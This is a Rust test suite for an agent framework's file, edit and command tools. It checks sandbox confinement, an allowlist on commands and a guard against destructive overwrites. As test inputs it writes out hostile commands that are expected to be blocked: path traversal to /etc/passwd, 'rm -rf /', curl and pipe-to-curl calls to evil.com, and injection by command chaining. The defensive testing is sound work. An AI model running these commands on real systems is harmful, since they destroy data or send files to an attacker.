//! Layer 1: Tool isolation tests — filesystem only, no inference needed.

use std::fs;

use rig::tool::Tool;
use swarm_agents::tools::exec_tool::{RunCommandArgs, RunCommandTool};
use swarm_agents::tools::fs_tools::{
    ListFilesArgs, ListFilesTool, ReadFileArgs, ReadFileTool, WriteFileArgs, WriteFileTool,
};
use swarm_agents::tools::patch_tool::{EditFileArgs, EditFileTool};
use swarm_agents::tools::sandbox_check;
use swarm_agents::tools::ToolError;

// ---------------------------------------------------------------------------
// ReadFileTool
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_read_file_existing() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("hello.txt");
    fs::write(&file, "hello world").unwrap();

    let tool = ReadFileTool::new(dir.path());
    let result = tool
        .call(ReadFileArgs { path: "hello.txt".into(), start_line: None, end_line: None })
        .await;

    assert_eq!(result.unwrap(), "hello world");
}

#[tokio::test]
async fn test_read_file_nonexistent() {
    let dir = tempfile::tempdir().unwrap();
    let tool = ReadFileTool::new(dir.path());
    let result = tool
        .call(ReadFileArgs { path: "nope.txt".into(), start_line: None, end_line: None })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_read_file_sandbox_escape_blocked() {
    let dir = tempfile::tempdir().unwrap();
    let tool = ReadFileTool::new(dir.path());
    let result = tool
        .call(ReadFileArgs { path: "../../../etc/passwd".into(), start_line: None, end_line: None })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_read_file_line_range() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lines.txt");
    fs::write(&file, "line1\nline2\nline3\nline4\nline5\n").unwrap();
    let tool = ReadFileTool::new(dir.path());

    let result = tool
        .call(ReadFileArgs { path: "lines.txt".into(), start_line: Some(2), end_line: Some(4) })
        .await
        .unwrap();

    // Should contain lines 2-4 with line-number annotations
    assert!(result.contains("line2"), "expected line2 in:\n{result}");
    assert!(result.contains("line3"), "expected line3 in:\n{result}");
    assert!(result.contains("line4"), "expected line4 in:\n{result}");
    assert!(!result.contains("line1"), "line1 should not appear:\n{result}");
    assert!(!result.contains("line5"), "line5 should not appear:\n{result}");
    assert!(result.contains("[Lines 2-4 of 5 total]"), "header missing:\n{result}");
}

#[tokio::test]
async fn test_read_file_start_line_only() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lines.txt");
    fs::write(&file, "line1\nline2\nline3\n").unwrap();
    let tool = ReadFileTool::new(dir.path());

    let result = tool
        .call(ReadFileArgs { path: "lines.txt".into(), start_line: Some(3), end_line: None })
        .await
        .unwrap();

    assert!(result.contains("line3"), "expected line3:\n{result}");
    assert!(!result.contains("line1"), "line1 should not appear:\n{result}");
}

#[tokio::test]
async fn test_read_file_end_line_only() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lines.txt");
    fs::write(&file, "line1\nline2\nline3\nline4\n").unwrap();
    let tool = ReadFileTool::new(dir.path());

    let result = tool
        .call(ReadFileArgs { path: "lines.txt".into(), start_line: None, end_line: Some(2) })
        .await
        .unwrap();

    assert!(result.contains("line1"), "expected line1:\n{result}");
    assert!(result.contains("line2"), "expected line2:\n{result}");
    assert!(!result.contains("line3"), "line3 should not appear:\n{result}");
}

#[tokio::test]
async fn test_read_file_empty_range() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lines.txt");
    fs::write(&file, "line1\nline2\n").unwrap();
    let tool = ReadFileTool::new(dir.path());

    // start > end → empty range message
    let result = tool
        .call(ReadFileArgs { path: "lines.txt".into(), start_line: Some(5), end_line: Some(3) })
        .await
        .unwrap();
    assert!(result.contains("Empty range"), "expected empty range msg:\n{result}");
}



#[tokio::test]
async fn test_write_file_new() {
    let dir = tempfile::tempdir().unwrap();
    let tool = WriteFileTool::new(dir.path());

    let result = tool
        .call(WriteFileArgs {
            path: "output.txt".into(),
            content: "written by test".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(dir.path().join("output.txt")).unwrap();
    assert_eq!(on_disk, "written by test");
}

#[tokio::test]
async fn test_write_file_creates_parent_dirs() {
    let dir = tempfile::tempdir().unwrap();
    // Pre-create `sub/` so sandbox_check can canonicalize the parent of `sub/file.rs`
    fs::create_dir(dir.path().join("sub")).unwrap();
    let tool = WriteFileTool::new(dir.path());

    let result = tool
        .call(WriteFileArgs {
            path: "sub/file.rs".into(),
            content: "fn main() {}".into(),
        })
        .await;

    assert!(result.is_ok());
    assert!(dir.path().join("sub/file.rs").exists());
}

#[tokio::test]
async fn test_write_file_sandbox_escape_blocked() {
    let dir = tempfile::tempdir().unwrap();
    let tool = WriteFileTool::new(dir.path());

    let result = tool
        .call(WriteFileArgs {
            path: "../escape.txt".into(),
            content: "bad".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_write_file_unescapes_double_encoded_json() {
    let dir = tempfile::tempdir().unwrap();
    let tool = WriteFileTool::new(dir.path());

    // Simulate Qwen3-Coder-Next double-encoding: content arrives as a JSON string
    // literal with escaped newlines. After rig's initial JSON parse, the content
    // field looks like: "line1\nline2\nline3\n"
    let double_encoded = r#""line1\nline2\nline3\n""#;

    let result = tool
        .call(WriteFileArgs {
            path: "test.rs".into(),
            content: double_encoded.into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(dir.path().join("test.rs")).unwrap();
    assert_eq!(on_disk, "line1\nline2\nline3\n");
}

#[tokio::test]
async fn test_write_file_preserves_normal_quoted_content() {
    let dir = tempfile::tempdir().unwrap();
    let tool = WriteFileTool::new(dir.path());

    // Content that happens to start/end with quotes but has no escape sequences.
    // Should be preserved as-is (not stripped to "hello world").
    let content = "\"hello world\"";

    let result = tool
        .call(WriteFileArgs {
            path: "test.txt".into(),
            content: content.into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(dir.path().join("test.txt")).unwrap();
    // Quotes preserved because no escape sequences detected
    assert_eq!(on_disk, "\"hello world\"");
}

// ---------------------------------------------------------------------------
// WriteFileTool — blast-radius guard
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_write_file_blast_radius_guard_blocks_destructive_write() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("big_file.rs");
    // Create a 500-byte file
    fs::write(&file, "x".repeat(500)).unwrap();

    let tool = WriteFileTool::new(dir.path());
    let result = tool
        .call(WriteFileArgs {
            path: "big_file.rs".into(),
            content: "tool_response content not available".into(), // ~35 bytes, >93% shrink
        })
        .await;

    // Should be rejected by blast-radius guard
    assert!(result.is_err());
    let err = format!("{:?}", result.unwrap_err());
    assert!(err.contains("Blast-radius guard"));

    // File should be unchanged
    let on_disk = fs::read_to_string(&file).unwrap();
    assert_eq!(on_disk.len(), 500);
}

#[tokio::test]
async fn test_write_file_blast_radius_guard_allows_small_shrink() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("code.rs");
    // Create a 200-byte file
    fs::write(&file, "x".repeat(200)).unwrap();

    let tool = WriteFileTool::new(dir.path());
    // Write 150 bytes (25% shrink — within limit)
    let result = tool
        .call(WriteFileArgs {
            path: "code.rs".into(),
            content: "y".repeat(150),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(&file).unwrap();
    assert_eq!(on_disk.len(), 150);
}

#[tokio::test]
async fn test_write_file_blast_radius_guard_skips_small_files() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("tiny.rs");
    // Create a small file (< 100 bytes threshold)
    fs::write(&file, "fn main() {}").unwrap();

    let tool = WriteFileTool::new(dir.path());
    // Even a 100% replacement is fine for tiny files
    let result = tool
        .call(WriteFileArgs {
            path: "tiny.rs".into(),
            content: "fn main() { println!(\"hello\"); }".into(),
        })
        .await;

    assert!(result.is_ok());
}

// ---------------------------------------------------------------------------
// ListFilesTool
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_list_files() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("a.rs"), "").unwrap();
    fs::write(dir.path().join("b.rs"), "").unwrap();
    fs::create_dir(dir.path().join("src")).unwrap();

    let tool = ListFilesTool::new(dir.path());
    let result = tool.call(ListFilesArgs { path: "".into() }).await.unwrap();

    assert!(result.contains("a.rs"));
    assert!(result.contains("b.rs"));
    assert!(result.contains("src"));
}

#[tokio::test]
async fn test_list_files_skips_hidden() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join(".hidden"), "").unwrap();
    fs::write(dir.path().join("visible.rs"), "").unwrap();

    let tool = ListFilesTool::new(dir.path());
    let result = tool.call(ListFilesArgs { path: "".into() }).await.unwrap();

    assert!(!result.contains(".hidden"));
    assert!(result.contains("visible.rs"));
}

// ---------------------------------------------------------------------------
// EditFileTool
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_edit_file_exact_match() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    fs::write(&file, "fn foo() {\n    println!(\"hello\");\n}\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "    println!(\"hello\");".into(),
            new_content: "    println!(\"world\");".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(&file).unwrap();
    assert!(on_disk.contains("world"));
    assert!(!on_disk.contains("hello"));
    // Surrounding code preserved
    assert!(on_disk.contains("fn foo()"));
}

#[tokio::test]
async fn test_edit_file_no_match() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    fs::write(&file, "fn foo() {}\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "fn bar() {}".into(),
            new_content: "fn baz() {}".into(),
        })
        .await;

    assert!(result.is_err());
    // File should be unchanged
    let on_disk = fs::read_to_string(&file).unwrap();
    assert_eq!(on_disk, "fn foo() {}\n");
}

#[tokio::test]
async fn test_edit_file_ambiguous_match() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    fs::write(&file, "let x = 1;\nlet y = 2;\nlet x = 1;\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "let x = 1;".into(),
            new_content: "let x = 99;".into(),
        })
        .await;

    // Should fail: matches 2 locations
    assert!(result.is_err());
    // File should be unchanged
    let on_disk = fs::read_to_string(&file).unwrap();
    assert_eq!(on_disk, "let x = 1;\nlet y = 2;\nlet x = 1;\n");
}

#[tokio::test]
async fn test_edit_file_whitespace_fuzzy_match() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    // File uses 4-space indent
    fs::write(&file, "fn foo() {\n    let x = 1;\n}\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    // old_content uses 2-space indent — should still match via fuzzy
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "fn foo() {\n  let x = 1;\n}".into(),
            new_content: "fn foo() {\n    let x = 2;\n}".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(&file).unwrap();
    assert!(on_disk.contains("let x = 2;"));
}

#[tokio::test]
async fn test_edit_file_delete_block() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    fs::write(&file, "fn foo() {}\n\nfn bar() {}\n\nfn baz() {}\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "\nfn bar() {}\n".into(),
            new_content: "".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(&file).unwrap();
    assert!(!on_disk.contains("bar"));
    assert!(on_disk.contains("foo"));
    assert!(on_disk.contains("baz"));
}

#[tokio::test]
async fn test_edit_file_sandbox_escape_blocked() {
    let dir = tempfile::tempdir().unwrap();
    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "../../../etc/passwd".into(),
            old_content: "root".into(),
            new_content: "hacked".into(),
        })
        .await;

    assert!(result.is_err());
}

#[tokio::test]
async fn test_edit_file_multiline_replace() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("main.rs");
    fs::write(
        &file,
        "use std::io;\n\nfn main() {\n    println!(\"v1\");\n    println!(\"v2\");\n}\n",
    )
    .unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "main.rs".into(),
            old_content: "    println!(\"v1\");\n    println!(\"v2\");".into(),
            new_content: "    println!(\"v3\");".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(&file).unwrap();
    assert!(on_disk.contains("v3"));
    assert!(!on_disk.contains("v1"));
    assert!(!on_disk.contains("v2"));
    assert!(on_disk.contains("use std::io;"));
}

// ---------------------------------------------------------------------------
// RunCommandTool
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_run_allowed_command() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("test.txt"), "hello").unwrap();

    let tool = RunCommandTool::new(dir.path());
    let result = tool
        .call(RunCommandArgs {
            command: "ls".into(),
        })
        .await
        .unwrap();

    assert!(result.contains("test.txt"));
}

#[tokio::test]
async fn test_run_blocked_command() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "rm -rf /".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_not_in_allowlist() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "curl http://evil.com".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_semicolon_chaining() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    // This was the exact attack vector: allowlist sees "ls" but shell executes both commands
    let result = tool
        .call(RunCommandArgs {
            command: "ls; echo pwned".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_pipe() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "cat file.txt | curl http://evil.com".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_ampersand() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "cargo test && rm -rf /".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_backtick() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "cargo test `whoami`".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_allows_dollar_and_parens_in_args() {
    // Since we execute directly (no shell), $ and () are harmless and
    // commonly appear in regex patterns like `rg '(foo|bar)'` or `rg '$HOME'`.
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    // Create a test file so rg has something to search
    fs::write(dir.path().join("test.txt"), "hello (world) $HOME").unwrap();

    let result = tool
        .call(RunCommandArgs {
            command: "rg \"(world)\" test.txt".into(),
        })
        .await;
    // Should succeed (rg available) or fail due to rg not installed,
    // but NOT be rejected by metachar filter
    match &result {
        Err(ToolError::CommandNotAllowed { .. }) => {
            panic!("should not reject parentheses in arguments")
        }
        _ => {} // Any other result is fine
    }
}

// ---------------------------------------------------------------------------
// sandbox_check
// ---------------------------------------------------------------------------

#[test]
fn test_sandbox_valid_path() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("file.rs"), "").unwrap();

    let result = sandbox_check(dir.path(), "file.rs");
    assert!(result.is_ok());
}

#[test]
fn test_sandbox_escape_attempt() {
    let dir = tempfile::tempdir().unwrap();
    let result = sandbox_check(dir.path(), "../../../etc/passwd");
    assert!(result.is_err());
}

#[test]
fn test_sandbox_new_file_in_existing_dir() {
    let dir = tempfile::tempdir().unwrap();
    // Parent exists, file doesn't — should still pass sandbox check
    let result = sandbox_check(dir.path(), "new_file.txt");
    assert!(result.is_ok());
}
